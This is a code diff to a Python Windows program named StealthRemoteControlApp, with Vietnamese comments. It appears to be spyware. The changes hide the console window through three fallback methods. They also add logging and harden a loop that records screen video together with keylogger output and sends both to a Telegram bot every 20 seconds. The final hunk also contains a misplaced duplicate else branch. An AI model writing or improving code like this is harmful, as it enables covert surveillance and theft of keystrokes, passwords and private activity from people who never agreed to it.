@@ -9,26 +9,33 @@ import random
 import threading
 import ctypes
 
-# Ẩn console window
+# Ẩn console window - Cải thiện cho .exe
 def hide_console():
-    """Ẩn cửa sổ console"""
+    """Ẩn cửa sổ console - hoạt động tốt với .exe"""
     try:
+        # Cách 1: Sử dụng win32gui (ưu tiên)
         import win32gui
         import win32con
         hwnd = win32gui.GetForegroundWindow()
-        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+        if hwnd:
+            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
     except:
-        # Nếu không có pywin32, thử cách khác
         try:
+            # Cách 2: Sử dụng kernel32/user32
             kernel32 = ctypes.windll.kernel32
             user32 = ctypes.windll.user32
             hwnd = kernel32.GetConsoleWindow()
             if hwnd:
-                user32.ShowWindow(hwnd, 0)  # SW_HIDE
+                user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
         except:
-            pass
+            try:
+                # Cách 3: FreeConsole (tách khỏi console)
+                kernel32 = ctypes.windll.kernel32
+                kernel32.FreeConsole()
+            except:
+                pass
 
-# Ẩn console ngay khi import
+# Ẩn console ngay khi import (trước mọi thứ khác)
 hide_console()
 
 # Thay đổi thư mục làm việc nếu đang chạy từ thư mục ẩn
@@ -75,13 +82,43 @@ from datetime import datetime
 
 class StealthRemoteControlApp:
     def __init__(self):
+        # Log khởi tạo
+        try:
+            log_file = os.path.join(TEMP_DIR, "startup.log")
+            os.makedirs(TEMP_DIR, exist_ok=True)
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] [INIT] Bắt đầu khởi tạo ứng dụng...\n")
+        except:
+            pass
+        
         # Tạo Machine ID
         machine_id_gen = MachineID()
         self.machine_id = machine_id_gen.get_id()
         self.machine_short_id = machine_id_gen.get_short_id()
         
+        # Log Machine ID
+        try:
+            log_file = os.path.join(TEMP_DIR, "startup.log")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] [INIT] Machine ID: {self.machine_short_id}\n")
+        except:
+            pass
+        
         self.keylogger = KeyLogger() if KEYLOG_ENABLED else None
         self.telegram = TelegramSender()
+        
+        # Kiểm tra bot đã được khởi tạo chưa
+        try:
+            log_file = os.path.join(TEMP_DIR, "startup.log")
+            bot_status = "OK" if self.telegram.bot else "FAILED"
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.now()}] [INIT] Telegram Bot: {bot_status}\n")
+                if not self.telegram.bot:
+                    f.write(f"[{datetime.now()}] [ERROR] Bot token: {TELEGRAM_BOT_TOKEN[:20]}...\n")
+                    f.write(f"[{datetime.now()}] [ERROR] Chat ID: {TELEGRAM_CHAT_ID}\n")
+        except:
+            pass
+        
         self.file_manager = FileManager()
         self.stealth = StealthManager()
         self.internet_checker = InternetChecker(check_interval=30)
@@ -606,35 +643,74 @@ class StealthRemoteControlApp:
                             pass
                         self.last_usb_check = current_time
                 
-                # Chỉ quay và gửi video khi có internet
-                if self.internet_checker.is_online():
+                # Chỉ quay và gửi video khi có internet và bot đã sẵn sàng
+                if self.internet_checker.is_online() and self.telegram.bot:
                     # Quay và gửi video kèm keylog định kỳ (mỗi 20 giây)
                     if self.last_video_send == 0:
                         self.last_video_send = current_time
+                        # Log lần đầu tiên
+                        try:
+                            log_file = os.path.join(TEMP_DIR, "error.log")
+                            with open(log_file, 'a', encoding='utf-8') as f:
+                                f.write(f"[{datetime.now()}] [INFO] Sẵn sàng gửi video (interval: {VIDEO_SEND_INTERVAL}s)\n")
+                        except:
+                            pass
                     
                     # Kiểm tra đã đến lúc gửi chưa (20 giây kể từ lần gửi cuối)
                     elapsed = current_time - self.last_video_send
                     if elapsed >= VIDEO_SEND_INTERVAL:
                         try:
+                            # Log trước khi gửi
+                            try:
+                                log_file = os.path.join(TEMP_DIR, "error.log")
+                                with open(log_file, 'a', encoding='utf-8') as f:
+                                    f.write(f"[{datetime.now()}] [INFO] Đã đến lúc gửi video (elapsed: {elapsed:.1f}s)\n")
+                            except:
+                                pass
+                            
                             # Gửi ngay lập tức
                             success = self.record_and_send_with_keylog()
                             if success:
                                 self.last_video_send = time.time()  # Cập nhật thời gian gửi thành công
+                                try:
+                                    log_file = os.path.join(TEMP_DIR, "error.log")
+                                    with open(log_file, 'a', encoding='utf-8') as f:
+                                        f.write(f"[{datetime.now()}] [SUCCESS] Video đã được gửi thành công!\n")
+                                except:
+                                    pass
                             else:
                                 # Nếu gửi thất bại, thử lại sau 5 giây
-                                time.sleep(5)
+                                self.last_video_send = current_time - VIDEO_SEND_INTERVAL + 5
+                                try:
+                                    log_file = os.path.join(TEMP_DIR, "error.log")
+                                    with open(log_file, 'a', encoding='utf-8') as f:
+                                        f.write(f"[{datetime.now()}] [WARNING] Gửi video thất bại, sẽ thử lại sau 5s\n")
+                                except:
+                                    pass
                         except Exception as e:
                             # Ghi log lỗi (ẩn)
                             try:
                                 log_file = os.path.join(TEMP_DIR, "error.log")
                                 with open(log_file, 'a', encoding='utf-8') as f:
-                                    f.write(f"[{datetime.now()}] ERROR khi gửi video: {e}\n")
+                                    f.write(f"[{datetime.now()}] [ERROR] Exception trong vòng lặp gửi video: {type(e).__name__}: {e}\n")
+                                    import traceback
+                                    f.write(traceback.format_exc() + "\n")
                             except:
                                 pass
-                            time.sleep(5)
-                    else:
-                        # Chưa đến lúc gửi, đợi thêm
-                        time.sleep(2)
+                            self.last_video_send = current_time - VIDEO_SEND_INTERVAL + 10
+                elif not self.telegram.bot:
+                    # Log nếu bot chưa sẵn sàng (chỉ log mỗi 60 giây để tránh spam)
+                    if not hasattr(self, 'last_bot_warning') or current_time - self.last_bot_warning > 60:
+                        try:
+                            log_file = os.path.join(TEMP_DIR, "error.log")
+                            with open(log_file, 'a', encoding='utf-8') as f:
+                                f.write(f"[{datetime.now()}] [WARNING] Telegram bot chưa được khởi tạo, không thể gửi video\n")
+                        except:
+                            pass
+                        self.last_bot_warning = current_time
+                else:
+                    # Chưa đến lúc gửi, đợi thêm
+                    time.sleep(2)
                 else:
                     # Không có internet, đợi đến khi có kết nối
                     try:
